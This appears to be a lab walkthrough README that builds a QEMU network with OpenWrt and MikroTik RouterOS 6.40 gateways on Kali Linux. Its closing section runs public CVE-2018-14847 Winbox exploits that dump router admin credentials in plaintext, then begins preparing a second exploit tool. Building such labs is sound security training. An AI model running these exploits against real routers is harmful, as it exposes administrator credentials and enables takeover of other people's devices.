## System Preparation

```bash
# if the kali.org mirror is not available, replace it
└─$ sudo nano /etc/apt/sources.list
```
```
deb http://kali.mirror.garr.it/mirrors/kali kali-rolling main contrib non-free non-free-firmware
```
---

```bash
# Create and navigate to the working directory
└─$ mkdir ~/lab
└─$ cd ~/lab
```

### Install dependencies
```bash
# for wine32 & winbox
└─$ sudo dpkg --add-architecture i386

# update & install dependencies
└─$ sudo apt-get update
└─$ sudo apt-get install screen qemu-system-x86 bridge-utils

# for winbox
└─$ sudo apt-get install wine32

└─$ sudo apt autoremove

# In order to then run winbox in the namespace via wine32
└─$ sudo winecfg
```

## Network Interface Configuration

```bash
# Create br-wan for WAN (between host and Gateway #1)
└─$ sudo brctl addbr br-wan
└─$ sudo ip link set dev br-wan up
```

```bash
# Create br-net-1 for connection between Gateway #1 and Gateway #2
└─$ sudo brctl addbr br-net-1
└─$ sudo ip link set dev br-net-1 up
```

```bash
# Create br-lan for LAN (between Gateway #2 and NS0)
└─$ sudo brctl addbr br-lan
└─$ sudo ip link set dev br-lan up
```

```bash
# Show created bridge interfaces
└─$ sudo brctl show
bridge name     bridge id               STP enabled     interfaces
br-lan          8000.000000000000       no
br-net-1        8000.000000000000       no
br-wan          8000.000000000000       no
```

```bash
# Create tap-1-wan interface for Gateway-1 and add it to br-wan
└─$ sudo ip tuntap add dev tap-1-wan mode tap
└─$ sudo ip link set tap-1-wan up
└─$ sudo brctl addif br-wan tap-1-wan

# Create tap-1-lan interface for Gateway-1 and add it to br-net-1
└─$ sudo ip tuntap add dev tap-1-lan mode tap
└─$ sudo ip link set tap-1-lan up
└─$ sudo brctl addif br-net-1 tap-1-lan

# Create tap-2-wan interface for Gateway-2 and add it to br-net-1
└─$ sudo ip tuntap add dev tap-2-wan mode tap
└─$ sudo ip link set tap-2-wan up
└─$ sudo brctl addif br-net-1 tap-2-wan

# Create tap-2-lan interface for Gateway-2 and add it to br-lan
└─$ sudo ip tuntap add dev tap-2-lan mode tap
└─$ sudo ip link set tap-2-lan up
└─$ sudo brctl addif br-lan tap-2-lan
```

```bash
# Show bridge interfaces with added tap interfaces
└─$ sudo brctl show
bridge name     bridge id               STP enabled     interfaces
br-lan          8000.aa226619aea3       no              tap-2-lan
br-net-1        8000.3225eca9f39b       no              tap-1-lan
                                                        tap-2-wan
br-wan          8000.ce4a79fb10e6       no              tap-1-wan
```

```bash
# If traffic is not passing between tap-1-lan and tap-2-wan in br-net-1, run the following
└─$ sudo sysctl -w net.bridge.bridge-nf-call-iptables=0
└─$ sudo sysctl -w net.bridge.bridge-nf-call-ip6tables=0
└─$ sudo sysctl -w net.bridge.bridge-nf-call-arptables=0
```

## Virtual Machine Image Preparation for QEMU

### OpenWrt VM

```bash
# Download OpenWrt 23.05.0 image
└─$ wget https://downloads.openwrt.org/releases/23.05.0/targets/x86/64/openwrt-23.05.0-x86-64-generic-ext4-combined.img.gz -O openwrt-23.05.0-x86-64-generic-ext4-combined.img.gz

# Unpack the downloaded image
└─$ gunzip -k openwrt-23.05.0-x86-64-generic-ext4-combined.img.gz

# Convert the image to QCOW2
└─$ qemu-img convert -f raw -O qcow2 openwrt-23.05.0-x86-64-generic-ext4-combined.img gateway_1.qcow2

# Resize the virtual disk
└─$ qemu-img resize gateway_1.qcow2 200M

# Delete unnecessary files
└─$ rm -rf openwrt-23.05.0-x86-64-generic-ext4-combined.*

# Launch OpenWrt
└─$ qemu-system-x86_64 \
    -name "Gateway #1" \
    -m 128M \
    -drive file="gateway_1.qcow2",id=d0,if=none,bus=0,unit=0 \
    -device ide-hd,drive=d0,bus=ide.0 \
    -netdev tap,id=net1_lan,ifname=tap-1-lan,script=no,downscript=no \
    -device virtio-net-pci,netdev=net1_lan,id=lan1,mac="52:54:00:01:00:01" \
    -netdev tap,id=net1_wan,ifname=tap-1-wan,script=no,downscript=no \
    -device virtio-net-pci,netdev=net1_wan,id=wan1,mac="52:54:00:01:00:02" \
    -enable-kvm \
    -nographic
```

### MikroTik VM

#### Installing MikroTik 6.40

```bash
# Prepare MikroTik (New Tab)
└─$ wget https://download.mikrotik.com/routeros/6.40/mikrotik-6.40.iso -O mikrotik.iso

# Resize the virtual disk
└─$ qemu-img create -f qcow2 gateway_2.qcow2 200M

# Launch MikroTik
└─$ qemu-system-x86_64 \
    -name "Gateway #2" \
    -m 128M \
    -cdrom mikrotik.iso \
    -drive file="gateway_2.qcow2",if=ide \
    -boot d \
    -netdev tap,id=net2_lan,ifname=tap-2-lan,script=no,downscript=no \
    -device virtio-net-pci,netdev=net2_lan,id=lan2,mac="52:54:00:02:00:01" \
    -netdev tap,id=net2_wan,ifname=tap-2-wan,script=no,downscript=no \
    -device virtio-net-pci,netdev=net2_wan,id=wan2,mac="52:54:00:02:00:02" \
    -enable-kvm
```

`Select system, dhcp, security, user-manager and press "i"`

![image](https://github.com/user-attachments/assets/48907a1c-fe7e-4324-bcff-232529ef1ad6)

```bash

Do you want to keep old configuration? [y/n]: n
Continue? [y/n]: y
```

#### Launching MikroTik 6.40

```bash
└─$ qemu-system-x86_64 \
    -name "Gateway #2" \
    -m 128M \
    -drive file="gateway_2.qcow2",if=ide \
    -netdev tap,id=net2_lan,ifname=tap-2-lan,script=no,downscript=no \
    -device virtio-net-pci,netdev=net2_lan,id=lan2,mac="52:54:00:02:00:01" \
    -netdev tap,id=net2_wan,ifname=tap-2-wan,script=no,downscript=no \
    -device virtio-net-pci,netdev=net2_wan,id=wan2,mac="52:54:00:02:00:02" \
    -enable-kvm \
    -nographic
```

#### MikroTik Console Login

```
MikroTik 6.40 (stable)
MikroTik Login: admin
Password:
```

```
  MMM      MMM       KKK                          TTTTTTTTTTT      KKK
  MMMM    MMMM       KKK                          TTTTTTTTTTT      KKK
  MMM MMMM MMM  III  KKK  KKK  RRRRRR     OOOOOO      TTT     III  KKK  KKK
  MMM  MM  MMM  III  KKKKK     RRR  RRR  OOO  OOO     TTT     III  KKKKK
  MMM      MMM  III  KKK KKK   RRRRRR    OOO  OOO     TTT     III  KKK KKK
  MMM      MMM  III  KKK  KKK  RRR  RRR   OOOOOO      TTT     III  KKK  KKK

  MikroTik RouterOS 6.40 (c) 1999-2017       http://www.mikrotik.com/


ROUTER HAS NO SOFTWARE KEY
----------------------------
You have 23h29m to configure the router to be remotely accessible,
and to enter the key by pasting it in a Telnet window or in Winbox.
Turn off the device to stop the timer.
See www.mikrotik.com/key for more details.

Current installation "software ID": XXXX-XXXX
Please press "Enter" to continue!
```

#### Network Interface Configuration

```bash
# Static IP Config on ether1
[admin@MikroTik] > /ip address add address=192.168.88.1/24 interface=ether1

# Static IP Config on ether2
[admin@MikroTik] > /ip address add address=192.168.1.2/24 interface=ether2
[admin@MikroTik] > /ip route add gateway=192.168.1.1
[admin@MikroTik] > /ip dns set servers=8.8.8.8,8.8.4.4
[admin@MikroTik] > /ip dns set allow-remote-requests=yes

# DHCP on ether2
[admin@MikroTik] > /ip dhcp-client add interface=ether2 disabled=no

# Diagnostics and removal of interfaces
[admin@MikroTik] > /ip dhcp-client print
[admin@MikroTik] > /ip dhcp-client remove 0
[admin@MikroTik] > /ip route print
[admin@MikroTik] > /ip route remove 0

# Firewall NAT
[admin@MikroTik] > /ip firewall nat add chain=srcnat out-interface=ether2 action=masquerade
```

### Working with Namespace

```bash
# Add Namespace NS0
└─$ sudo ip netns add ns0

# Move tap-2-lan to ns0
└─$ sudo ip link set tap-2-lan netns ns0

# Activate the interface
└─$ sudo ip netns exec ns0 ip link set tap-2-lan up

# Add a static IP address to tap-2-lan in ns0
└─$ sudo ip netns exec ns0 ip addr add 192.168.88.2/24 dev tap-2-lan

# Add default route for tap-2-lan in ns0
└─$ sudo ip netns exec ns0 ip route add default via 192.168.88.1 dev tap-2-lan

# Test connection with Mikrotik in ns0
└─$ sudo ip netns exec ns0 ping 192.168.88.1
```

### Winbox for Connecting to MikroTik

```bash
# Download and run winbox
└─$ wget https://download.mikrotik.com/routeros/winbox/3.41/winbox64.exe
└─$ sudo ip netns exec ns0 wine winbox64.exe
```

## Sharing Internet to VM

```bash
└─$ sudo sysctl -w net.ipv4.ip_forward=1
└─$ sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
└─$ sudo iptables -A FORWARD -i br-wan -o eth0 -j ACCEPT
└─$ sudo iptables -A FORWARD -i eth0 -o br-wan -m state --state RELATED,ESTABLISHED -j ACCEPT
```

```bash
# Set IP on br-wan interface
└─$ sudo ifconfig br-wan 192.168.55.1/24
# Run DHCP server
└─$ sudo dnsmasq --interface=br-wan \
        --bind-interfaces \
        --listen-address="192.168.55.1" \
        --dhcp-range="192.168.55.100,192.168.55.110,12h" \
        --no-daemon
```

## Attacking on MikroTik 6.40

### Exploit 1
`CVE-2018-14847`

All RouterOS versions from 2015-05-28 to 2018-04-20 are vulnerable to this exploit.  
Mikrotik devices running RouterOS versions: 6.29 - 6.43rc3  
[More details](https://mikrotik.com/supportsec/cve-2018-14847-winbox-vulnerability)  
[Exploit on GitHub 1](https://github.com/dharmitviradia/Mikrotik-WinBox-Exploit)  
[Exploit on GitHub 2](https://github.com/BigNerd95/WinboxExploit)  
[Exploit on Exploit-DB](https://www.exploit-db.com/exploits/45170)

```bash
└─$ cd exploit
└─$ git clone https://github.com/dharmitviradia/Mikrotik-WinBox-Exploit exploit
└─$ cd ..
```

```bash
└─$ sudo ip netns exec ns0 python3 exploit/MACServerDiscover.py   
```

```
Looking for Mikrotik devices (MAC servers)

        52:54:00:02:00:01
```

```bash
└─$ sudo ip netns exec ns0 python3 exploit/MACServerExploit.py 52:54:00:02:00:01
```

```
User: root
Pass: 123

User: admin
Pass: 

User: admin
Pass: F71rY26hMv2G
```

```bash
# Run the exploit in ns0 namespace for 192.168.88.1
└─$ sudo ip netns exec ns0 python3 exploit/exploit.py 192.168.88.1
```

```
192.168.88.1
User: root
Pass: 123

User: admin
Pass: F71rY26hMv2G
```

### Exploit 2

[Research article](https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/)  
[FOISted on GitHub](https://github.com/MarginResearch/FOISted)

```bash
└─$ sudo apt install python3.12-venv
└─$ python3 -m venv venv
└─$ source venv/bin/activate
└─$ pip3 install pycryptodome donna25519 pynacl

└─$ git clone https://github.com/MarginResearch/FOISted
```
